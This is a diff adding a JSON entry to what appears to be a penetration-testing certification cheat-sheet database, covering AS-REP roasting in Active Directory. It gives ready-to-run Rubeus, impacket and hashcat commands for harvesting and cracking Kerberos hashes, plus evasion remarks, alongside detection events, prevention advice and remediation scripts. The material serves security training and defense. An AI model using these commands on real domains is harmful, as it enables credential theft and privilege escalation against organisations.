@@ -1,0 +1,110 @@
+{
+  "id": "crtp-asrep-roasting",
+  "name": "AS-REP Roasting (Rubeus)",
+  "command": "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep_hashes.txt",
+  "description": "Request AS-REP responses for accounts with Kerberos pre-authentication disabled and crack them offline. No credentials required.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Domain PrivEsc",
+  "type": "command",
+  "certifications": [
+    "CRTP",
+    "CPTS",
+    "OSCP"
+  ],
+  "source": "CRTP",
+  "opsec": "quiet",
+  "mitre": [
+    "T1558.004"
+  ],
+  "tools": [
+    "Rubeus"
+  ],
+  "tags": [
+    "asrep",
+    "roasting",
+    "preauthentication",
+    "kerberos",
+    "rubeus"
+  ],
+  "steps": [
+    {
+      "label": "Roast all eligible accounts",
+      "command": "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep_hashes.txt"
+    },
+    {
+      "label": "Target specific user",
+      "command": "Rubeus.exe asreproast /user:<user> /format:hashcat /nowrap"
+    },
+    {
+      "label": "Crack with hashcat",
+      "command": "hashcat -m 18200 asrep_hashes.txt <wordlist>"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Roast all to hashcat format",
+      "command": "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:C:\\Temp\\asrep.txt"
+    },
+    {
+      "label": "From Linux with GetNPUsers",
+      "command": "impacket-GetNPUsers <domain>/ -dc-ip <dc_ip> -usersfile <userlist> -no-pass -format hashcat"
+    },
+    {
+      "label": "Crack with hashcat",
+      "command": "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-user-enumeration",
+      "note": "Find pre-auth disabled accounts first",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-asrep-crack",
+      "note": "CPTS card for cracking AS-REP hashes",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-dcsync",
+      "note": "DCSync with cracked high-priv account",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-kerberoasting",
+      "note": "Also roast SPN accounts",
+      "rel": "alternative"
+    }
+  ],
+  "notes": "Roastable = DoesNotRequirePreAuth=True. Can also be set via GenericWrite/GenericAll for targeted attack.",
+  "references": [
+    {
+      "title": "CRTP - AS-REP Roasting",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "HackTricks - AS-REP Roasting",
+      "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Kerberos pre-authentication forces clients to encrypt a timestamp with the user's key before the KDC issues a TGT. When pre-auth is disabled (DoesNotRequirePreAuth = True), the KDC returns an AS-REP containing data encrypted with the user's hash — without requiring any authentication. An attacker sends an AS-REQ for the target account and receives the crackable ciphertext without knowing the password.",
+    "prerequisites": "Network access to DC on port 88. At least one domain account with DoesNotRequirePreAuth = True (or no domain account at all — AS-REP roasting works unauthenticated when the list of vulnerable accounts is known). Rubeus /asreproast or impacket-GetNPUsers.",
+    "impact": "T1558.004 Steal or Forge Kerberos Tickets: AS-REP Roasting. Obtains crackable ticket for accounts with pre-auth disabled. Completely unauthenticated if target account is known. Success rate depends on password strength.",
+    "detection": "Event 4768 (TGT Request) with Pre-Authentication Type = 0 (no pre-auth) — legitimate users always have pre-auth type > 0. MDI 'AS-REP roasting' alert. Bulk 4768 requests from a single source with different cnames. Zeek Kerberos: AS-REQ without encrypted timestamp.\nAnomalous Kerberos activity: forged or stolen tickets by correlating malformed fields in logon events, RC4-encrypted TGTs, or TGS requests without corresponding TGT requests; suspicious processes accessing LSASS memory for ticket extraction (DET0522/AN1443).\nSuspicious access to SSSD secrets database and Kerberos key material indicating ticket theft or replay; correlate anomalous file access with unusual Kerberos service ticket requests (AN1444).\nForging or replaying Kerberos tickets: monitor Unified Logs for anomalous kinit/klist activity and unusual authentication sequences (AN1445).",
+    "artifacts": "Event 4768 with PreAuthType=0 from unexpected source | MDI alert: 'AS-REP roasting attack' | Zeek kerberos.log: AS-REQ with no enc-timestamp | SIEM: multiple 4768 PA-Type=0 from single IP",
+    "prevention": "Enable Kerberos pre-authentication on all accounts (default; audit for exceptions). Use Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} regularly and remediate. MDI deployment. Long passwords on any account that must have pre-auth disabled (legacy compatibility).\nActive Directory Configuration: Reset KRBTGT account password twice (invalidates all golden tickets); rotate every 180 days.\nAudit: Scan for insecure Kerberos configurations.\nCredential Access Protection: On Linux, use SELinux to protect Kerberos key material.\nEncrypt Sensitive Information: Enable AES Kerberos encryption instead of RC4.\nPassword Policies: Service accounts should have 25+ character passwords; use Group Managed Service Accounts (gMSA).\nPrivileged Account Management: Limit domain admin to DCs only; restrict service account privileges.",
+    "evasion": "Unauthenticated attack — can be launched from outside the domain. Single request per target account — minimal noise compared to Kerberoasting. Use Rubeus /nowrap for clean output.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1558/004/"
+    ],
+    "misconfiguration": "Accounts created with 'Do not require Kerberos preauthentication' checked — often legacy service accounts or misconfigured automation accounts. No periodic audit for this attribute.",
+    "vulnerable_config": "# Accounts vulnerable to AS-REP roasting:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth\n# Output: svc_legacy — DoesNotRequirePreAuth: True → VULNERABLE\n\n# Can be exploited without any credentials:\n# Rubeus.exe asreproast /user:svc_legacy /format:hashcat /outfile:asrep.txt\n# → $krb5asrep$23$svc_legacy@CORP.LOCAL:... (crack with hashcat -m 18200)",
+    "secure_config": "# Audit and fix all pre-auth disabled accounts:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | ForEach-Object {\n  Set-ADAccountControl $_ -DoesNotRequirePreAuth $false\n  Write-Output \"Fixed: $($_.SamAccountName)\"\n}\n\n# Scheduled task / quarterly audit:\n$vuln = Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}\nif ($vuln) { Send-MailMessage -To 'security@corp.local' -Subject 'AS-REP Roastable Accounts Found' -Body ($vuln | Out-String) }\n\n# MDI: 'AS-REP roasting attack' alert enabled by default on MDI deployment"
+  }
+}
